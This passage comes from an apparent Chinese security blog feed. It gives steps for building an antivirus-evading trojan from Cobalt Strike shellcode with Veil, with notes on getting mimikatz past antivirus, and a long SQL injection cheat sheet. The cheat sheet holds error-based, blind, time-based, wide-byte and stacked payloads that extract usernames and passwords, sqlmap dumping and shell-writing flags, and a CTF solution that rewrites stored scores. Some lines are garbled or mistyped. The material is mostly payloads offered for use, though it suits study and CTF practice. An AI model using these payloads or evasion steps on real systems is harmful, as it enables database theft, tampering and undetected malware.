class="line">3</span><br></pre></td><td class="code"><pre><span class="line">veil</span><br><span class="line">use Evasion</span><br><span class="line">list</span><br></pre></td></tr></table></figure><p>这里使用第 17 个即 <code>go/shellcode_inject/virtual.py</code> Payload 作为示例，因为 go、c 等编译性语言语言相对于 python 等脚本语言来说免杀效果会好些。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 17</span><br></pre></td></tr></table></figure><p>之后输入 <code>generate</code>，选择第三项 <code>Custom shellcode string</code> ，粘贴刚生成的 payload.txt 文本内容，输入要生成的 exe 文件名，即可生成一个免杀木马。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">generate</span><br><span class="line">3</span><br><span class="line">粘贴 payload.txt 内容</span><br><span class="line">bypass_go#生成文件的名称</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230114165636386.png" alt="image-20230114165636386" style="zoom:50%;" /><p>实测可以过360 安全卫士、 360 杀毒，但腾讯电脑管家、火绒不行</p><h6 id="白名单绕过Defender查杀"><a href="#白名单绕过Defender查杀" class="headerlink" title="白名单绕过Defender查杀"></a>白名单绕过Defender查杀</h6><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/779828f3e037c045604e662ad4a52f95f5fb665f.png" alt="image-20230102224037589" style="zoom: 67%;" /><p><strong>mkdir %SystemDrive%\PHP5433</strong></p><p>mimikatz 免杀过 360 安全卫士和 360 安全杀毒</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3161ec6053b2e27555d16ac52c4432dcb7777fff.png" alt="image-20230102224410458" style="zoom:67%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;Cobalt-strike的安装与使用&quot;&gt;&lt;a href=&quot;#Cobalt-strike的安装与使用&quot; class=&quot;headerlink&quot; title=&quot;Cobalt strike的安装与使用&quot;&gt;&lt;/a&gt;&lt;strong&gt;Cobalt strike的安装与使用&lt;/</summary>
      
    
    
    
    <category term="工具使用" scheme="https://micgo.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="CS" scheme="https://micgo.top/tags/CS/"/>
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2022-09-25T16:00:00.000Z</published>
    <updated>2023-03-22T12:33:11.841Z</updated>
    
    <content type="html"><![CDATA[<p>常用闭合方式判断<br>判断闭合方式，目前掌握的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)，都不行的话试试宽字节注入</p><p>当单引号或者双引号出现回显或者语法错误时，如何判断是否带括号呢？</p><p>抄袭一波大神的判断方式</p><p>遇到SQL注入第一步判断闭合：<br>首先尝试：</p><p>?id&#x3D;1’<br>?id&#x3D;1”</p><p>1如果都报错，则为整形闭合。</p><p>2如果单引号报错，双引号不报错。<br>然后尝试</p><p>?id&#x3D;1’ –+<br>?id&#x3D;1’ #</p><p>无报错则单引号闭合。<br>报错则单引号加括号。</p><p>3如果单引号不报错，双引号报错。<br>然后尝试</p><p>?id&#x3D;1” –+<br>?id&#x3D;1” #</p><p>无报错则双引号闭合。<br>报错则双引号加括号。</p><p>输入（其中id&#x3D;1,1是正确的数据库存在的值），正常回显</p><p>?id&#x3D;1 and true –+<br>或者<br>?id&#x3D;true and true –+</p><p>输入，错误回显</p><p>?id&#x3D;1 and false –+<br>或者<br>?id&#x3D;true and false –+</p><p>那么就是整形闭合</p><p>输入（其中id&#x3D;1,1是正确的数据库存在的值），正常回显</p><p>?id&#x3D;1’ and true –+<br>或者<br>?id&#x3D;true‘ and true –+</p><p>输入，错误回显</p><p>?id&#x3D;1’ and false –+<br>或者<br>?id&#x3D;true‘ and false –+</p><p>那么就是单引号闭合，其他符号同理</p><p>单引号转义绕过<br>当时用单引号’，代码转义为\’，就使用如下方式替换掉单引号</p><p>%df%27<br>�’<br>%EF%BF%BD</p><p>万能密码</p><p>�’ and1&#x3D;1 #<br>database()<br>返回当前数据库名</p><p>version()<br>返回数据库的版本号</p><p>CONCAT(s1,s2…sn)<br>字符串 s1,s2 等多个字符串合并为一个字符串</p><p>CONCAT_WS(x, s1,s2…sn)<br>同 CONCAT(s1,s2,…) 函数，但是每个字符串之间要加上 x，x 可以是分隔符</p><p>LIMIT<br>mysql&gt; SELECT * FROM table LIMIT 5,10; &#x2F;&#x2F; 检索记录行 6-15</p><p>&#x2F;&#x2F;为了检索从某一个偏移量到记录集的结束所有的记录行，可以指定第二个参数为 -1：<br>mysql&gt; SELECT * FROM table LIMIT 95,-1; &#x2F;&#x2F; 检索记录行 96-last.</p><p>&#x2F;&#x2F;如果只给定一个参数，它表示返回最大的记录行数目：<br>mysql&gt; SELECT * FROM table LIMIT 5; &#x2F;&#x2F;检索前 5 个记录行</p><p>&#x2F;&#x2F;换句话说，LIMIT n 等价于 LIMIT 0,n。</p><p>mid() substr（）</p><p>Substr()和substring()函数实现的功能是一样的，均为截取字符串。</p><p>string substring(string, start, length)</p><p>string substr(string, start, length)</p><p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度</p><p>ASCII<br>返回字符串 s 的第一个字符的 ASCII 码。<br>返回 CustomerName 字段第一个字母的 ASCII 码：</p><p>SELECT ASCII(CustomerName) AS NumCodeOfFirstChar<br>FROM Customers;</p><p>count<br>返回查询的记录总数，expression 参数是一个字段或者 * 号</p><p>返回 Products 表中 products 字段总共有多少条记录：</p><p>SELECT COUNT(ProductID) AS NumberOfProducts FROM Products;</p><p>所以，只要发现有SQL注入，我们可以操纵SQL语句，将mysql数据库的库，表，字段一个一个查询出来</p><p>实在不行的话，试一下<strong>弱密码</strong></p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; or 1=if(ascii(substr((database()),1,1))&gt;1000,0,1)#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> wfy_admin )),<span class="number">0</span>)#</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select(group_concat(text))from(wfy_comments)where(text)regexp(&#x27;</span>&#125;$<span class="string">&#x27;)),0x7e),1)%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%27+or+updatexml%281%2Cconcat%280x7e%2C%28select%28group_concat%28text%29%29from%28wfy_comments%29where%28text%29like%28%27f%%27%29%29%2C0x7e%29%2C1%29%23</span></span><br><span class="line"><span class="string">/*    &#x27;</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>(<span class="keyword">select</span>(group_concat(text))<span class="keyword">from</span>(wfy_comments)<span class="keyword">where</span>(text)<span class="keyword">like</span>(<span class="string">&#x27;f%&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)#  <span class="operator">*</span><span class="operator">/</span> </span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/database()),0x7e))/**/||&#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;or/**/if(1,0,0)/**/or/**/benchmark(1000000000,0)#</span></span><br></pre></td></tr></table></figure><p>注意有可能爆出来中文…………，可以直接regexp或者like匹配到flag，或者16进制编码处理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns</span><br></pre></td></tr></table></figure><h5 id="sqlmap工具的详细使用"><a href="#sqlmap工具的详细使用" class="headerlink" title="sqlmap工具的详细使用"></a>sqlmap工具的详细使用</h5><p>注入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-u #注入点</span><br><span class="line">-g  #谷歌搜索</span><br><span class="line">-f #指纹判别数据库类型</span><br><span class="line">-b#获取数据库版本信息</span><br><span class="line">-p #指定可测试的参数（?page=1&amp;id=2 -p&quot;page,id&quot;）</span><br><span class="line">-D &quot;&quot;   #指定数据库名</span><br><span class="line">-T &quot;&quot;     #指定表名</span><br><span class="line">-C &quot;&quot;  #指定字段</span><br><span class="line">-s &quot;&quot;    #保存注入过程到一个文件，还可中断，下次恢复在注入（保存：-s “xx.log” -resume）</span><br><span class="line">-columns   #列出字段</span><br><span class="line">-current-user #获取当前用户名称</span><br><span class="line">-current-db   #获取当前数据库名称</span><br><span class="line">-users        #列出数据库所有用户</span><br><span class="line">-passwords    #数据库用户所有密码</span><br><span class="line">-privileges   #查看用户权限（-privileges -U root）</span><br><span class="line">-U  #指定数据库用户</span><br><span class="line">-dbs   #列出所有数据库</span><br><span class="line">-tables -D &quot;&quot;  #列出指定数据库中的表</span><br><span class="line">-columns -T &quot;user&quot; -D &quot;mysql&quot; #列出mysql数据库中的user表的所有字段</span><br><span class="line">-dump-all #列出所有数据库所有表</span><br><span class="line">-exclude-sysdbs  #只列出用户自己新建的数据库和表</span><br><span class="line">-dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;    #列出指定数据库的表的字段的数据（-dump -T users -D master -C surname）</span><br><span class="line">-dump -T &quot;&quot;-D &quot;&quot; -start 2 -top 4 #列出指定数据库的表的2-4字段的数据</span><br><span class="line">-dbms #指定数据库（MySQL，Oracle，PostgreSQL，Microsoft SQL Sever，Microsoft Access，SQLite，Firebird，Sybase，SAP，MaxDB）</span><br><span class="line">-os #指定系统（Linux，Windows）</span><br><span class="line">-sql -shell     #写shell</span><br><span class="line">-delay     #延迟的时间</span><br><span class="line">-m    #可以执行多个url</span><br><span class="line">–lever 3 --risk 5  #调整SQL注入的强度</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>post传参</strong></p><p>抓包，保存为txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -p 参数名</span><br><span class="line">#-r表示加载一个文件，-p指定参数</span><br></pre></td></tr></table></figure><p><strong>自定义脚本tamper</strong></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20220812205150887.png" alt="image-20220812205150887"></p><h5 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h5><p><strong>insert用法</strong></p><p>sql语句为 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Student VALUES (&#x27;bob&#x27;, &#x27;15&#x27;, &#x27;99&#x27;)</span><br></pre></td></tr></table></figure><p>当然也可在指定的列中插入数据，例如 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Student(name,age) VALUES (&#x27;bob&#x27;, &#x27;15&#x27;)</span><br></pre></td></tr></table></figure><p>同时，insert还可以在数据库查询语句中用作字符串替换，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select insert(&quot;admin&quot;, 1, 1, &quot;&quot;);</span><br></pre></td></tr></table></figure><p>上述语句查询结果为：</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/cb1c4644d8009cecd2a85e4c801a4271.png" alt="image-20211110082442571"></p><p>可以看见，insert语句可以将字符串指定位置的指定长度替换为指定字符串，该功能的insert语法为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT(s1，x，len，s2)</span><br></pre></td></tr></table></figure><p>其中的s1为目标字符串，x为替换的起始位置，len为替换的长度，s2为替换的字符串。通过改变len的值，可以获取到不同长度的字符串：</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/39fb30f5985d76a07d63447e216bc855.png" alt="image-20211110084334619"></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3118fd4b98ccf9df4ecd2310e8705f49.png" alt="image-20211110084405289"></p><p>insert进行盲注爆破<br>那么，如果将两个insert套起来，是不是就相当于字符串的分割了呢，在第一个insert得到的字符串在进行一次insert的字符串替换，是不是就相当于字符串分割了，例如，输入语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select insert(insert(&quot;admin&quot;, 1, 0, &quot;&quot;), 2, 99999, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">select insert(insert(&quot;admin&quot;, 1, 1, &quot;&quot;), 2, 99999, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">select insert(insert(&quot;admin&quot;, 1, 2, &quot;&quot;), 2, 99999, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">select insert(insert(&quot;admin&quot;, 1, 3, &quot;&quot;), 2, 99999, &quot;&quot;);</span><br></pre></td></tr></table></figure><p>其运行结果为：</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/605a2553da68ba5efd9f6aba24a654cf.png" alt="image-20211109215916734"></p><p>这样，就可以很好的进行盲注的爆破了，并且insert语句也不易被检测到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into member(username,<span class="built_in">id</span>) values(<span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database())),<span class="number">0</span>) o<span class="string">r&#x27;&#x27;</span> , <span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/15592525-d171ca72aa1c81a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/413/format/webp" alt="img"></p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(命令)),<span class="number">0</span>) o<span class="string">r&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(命令)) o<span class="string">r&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/15592525-0e7af7188bc3c342.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p><strong>利用name_const()获取数据</strong></p><p>name_const()函数是 MYSQL5.0.12 版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。</p><p>Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or</span><br></pre></td></tr></table></figure><p>Insert：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (id, username, password) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">&#x27;micgo&#x27;</span> <span class="keyword">or</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(name_const(version(),<span class="number">1</span>)),name_const(version(),<span class="number">1</span>))a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;Nervo&#x27;</span>);</span><br></pre></td></tr></table></figure><p>update：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;Nicky&#x27;</span> <span class="keyword">or</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(name_const(version(),<span class="number">1</span>)),name_const(version(),<span class="number">1</span>))a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span><span class="string">&#x27;Nervo&#x27;</span>;</span><br></pre></td></tr></table></figure><p>delete：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(name_const(version(),<span class="number">1</span>)),name_const(version(),<span class="number">1</span>))a)<span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>提取数据：</p><p>在最新的MYSQL版本中，使用name_const()函数只能提取到数据库的版本信息。但是在一些比较旧的高于5.0.12(包括5.0.12)的MYSQL版本中，可以进一步提取更多数据。在这里我使用MySQL5.0.45进行演示。</p><p>首先，我们做一个简单的SELECT查询，检查我们是否可以提取数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (id, username, password) <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">&#x27;micgo&#x27;</span> <span class="keyword">or</span> (<span class="keyword">SELECT</span><span class="operator">*</span><span class="keyword">FROM</span>(<span class="keyword">SELECT</span> name_const((<span class="keyword">SELECT</span> <span class="number">2</span>),<span class="number">1</span>),name_const((<span class="keyword">SELECT</span> <span class="number">2</span>),<span class="number">1</span>))a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;Nervo&#x27;</span>);</span><br></pre></td></tr></table></figure><p>如果显示ERROR 1210 (HY000): Incorrect arguments to NAME_CONST，那就不行了</p><p>如果显示ERROR 1060 (42S21): Duplicate column name ‘2’，就可以进一步获取更多数据</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/2014091813502258628.png" alt="enter image description here"></p><p>获取newdb数据库表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id, username, password) VALUES (1,&#x27;Olivia&#x27; or (SELECT*FROM(SELECT name_const((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1),name_const(( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1))a) or &#x27;&#x27;, &#x27;Nervo&#x27;);</span><br><span class="line"></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;users&#x27;</span><br></pre></td></tr></table></figure><p>获取users表的列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id, username, password) VALUES (1,&#x27;Olivia&#x27; or (SELECT*FROM(SELECT name_const((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27; limit 0,1),1),name_const(( SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27; limit 0,1),1))a) or &#x27;&#x27;, &#x27;Nervo&#x27;);</span><br><span class="line"></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br></pre></td></tr></table></figure><p>获取users表的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id, username, password) VALUES (2,&#x27;Olivia&#x27; or (SELECT*FROM(SELECT name_const((SELECT concat_ws(0x7e,id, username, password) FROM users limit 0,1),1),name_const(( SELECT concat_ws(0x7e,id, username, password) FROM users limit</span><br><span class="line">0,1),1))a) or &#x27;&#x27;, &#x27;Nervo&#x27;);</span><br><span class="line"></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;1~Jane~Eyre&#x27;</span><br></pre></td></tr></table></figure><p>首先逐个测试闭合点，然后用&#x2F;*   *&#x2F;注释符找出先后顺序，然后进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comment<span class="operator">=</span><span class="number">123</span><span class="string">&#x27;/*&amp;name=*/,(select database()),&#x27;</span>micgo<span class="string">&#x27;)%23 &amp; user=123</span></span><br></pre></td></tr></table></figure><h5 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h5><p>update语句的格式一般为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update &lt;table_name&gt; set column = where &lt;条件&gt;</span><br></pre></td></tr></table></figure><h5 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h5><p>delete语句一般为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from &lt;table_name&gt; where &lt;条件&gt;</span><br></pre></td></tr></table></figure><p>原理还是和上面一样，只是这个要注意一下不要把数据库里面的内容删了，所以一定要保持最后逻辑表达式的结果为假。or连接词慎用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and sleep(3) 结果为假</span><br><span class="line">1 and updatexml(1,(select concat(’~’,user())),1) 报错最终结果为假</span><br></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="newstart-multiSQL"><a href="#newstart-multiSQL" class="headerlink" title="newstart multiSQL"></a>newstart multiSQL</h5><p>根据题目翻译考的是堆叠注入，试了一下果然可以，题目要求把火华师傅的四级成绩改到425分以上，发现<code>union,select,update,insert</code> 都被过滤了，这里我们可以利用<code>replace into</code> (替换插入) 进行数据修改,再利用<code>delete</code>删除原数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST: </span><br><span class="line">username=%E7%81%AB%E5%8D%8E&#x27;;show tables;#查数据库里所有的表</span><br><span class="line">username=%E7%81%AB%E5%8D%8E&#x27;;desc score;#查score表中所有字段</span><br><span class="line">username=%E7%81%AB%E5%8D%8E&#x27;;replace into score values(&quot;火华&quot;,200,200,200);#表中插入一条数据</span><br><span class="line">username=%E7%81%AB%E5%8D%8E&#x27;;delete from score where listen=11;#删除原本的数据</span><br></pre></td></tr></table></figure><p>操作完以后，点击验证数据就可以拿到flag，复现的时候注意中文符号以及不要重复多次执行sql语句，有可能有奇奇怪怪的错误。</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>宽字节概念<br>  单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)。<br>  多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p><p>  宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字。</p><p><strong>函数addslashes()</strong><br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符：单引号（’），双引号（”），反斜杠（\）</p><p>替换反斜杠，反斜杠的GBK编码为%5C，根据GBK编码在前面加上%DE，%DF，%E0等都可以组成一个汉字，从而把反斜杠给吃掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> Payload：?id=%E0&#x27; or sleep(3)%23</span><br></pre></td></tr></table></figure><h4 id="延时注入总结"><a href="#延时注入总结" class="headerlink" title="延时注入总结"></a>延时注入总结</h4><h5 id="逐字注入"><a href="#逐字注入" class="headerlink" title="逐字注入"></a>逐字注入</h5><p>能够截取字符串，同时能触发延时即可！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Select *from table Where id =1 and (if(substr(database(),1,1)=&#x27;u&#x27;, sleep(3), null));</span><br><span class="line">Select * from table where id= 1 and (if(ascii(substr(database(),1,1))=100, sleep(3), null));</span><br></pre></td></tr></table></figure><h5 id="BENCHMARK"><a href="#BENCHMARK" class="headerlink" title="BENCHMARK"></a>BENCHMARK</h5><p>除了sleep之外的时间延时注入，还有：BENCHMARK(count,expr)</p><p>BENCHMARK()函数重复 count次执行表达式expr。它可以被用于计算 MYSQL处理表达式的速度。结果值通常为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(100000000,sha(1));</span><br><span class="line">Select * from table where id= 1 and (if(ascii(substr(database(),1,1))=100,benchmark(100000000,sha(1)), null));</span><br></pre></td></tr></table></figure><h5 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from user A,user B;</span><br><span class="line">SELECT count (*) FROM information_schema.columns A,information_schema.columns B,information_schema.tables C;</span><br></pre></td></tr></table></figure><h5 id="GET-LOCK"><a href="#GET-LOCK" class="headerlink" title="GET_LOCK"></a>GET_LOCK</h5><p>除了sleep之外的时间延时注入，还有：GET_LOCK(str,timeout)</p><p>函数使用说明：设法使用字符串str给定的名字得到一个锁，超时为timeout秒。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select GET_LOCK(&#x27;a&#x27;,10)</span><br></pre></td></tr></table></figure><p>注意：设置锁后，需要新开 一 个窗口并且是长连接才会有效。</p><h5 id="RLIKE"><a href="#RLIKE" class="headerlink" title="RLIKE"></a>RLIKE</h5><p>除了sleep之外的时间延时注入，还有RLKE。</p><p>通过 rpad 或 repeat 构造长字符串，加以计算量大的 pattern，通过repeats的参数可以控制延时长短。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select concat (rpad (1,999999,a),rpad (1,999999,a),rpad(1,999999,a) ,rpad(1,999999,a) </span><br><span class="line">,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a) </span><br><span class="line">,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rp</span><br><span class="line">ad(1,999999,a) ,rpad (1,999999,a),rpad(1,999999,a),rpad(1,999999,a )) RLIKE &#x27;(a.*)+(a.*)+</span><br><span class="line">(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;;</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入条件:  后台没有屏蔽数据库报错信息，在语法发生错误的时候会输出在前端</p><p>常用四个报错函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">updatexml()    xpath报错注入  updatexml(1,concat(0x7e,database()),0)</span><br><span class="line">extractvalue() xpath报错注入  extracrvalue(0,concat(0x7e,database()))</span><br><span class="line">floor()        取整函数</span><br><span 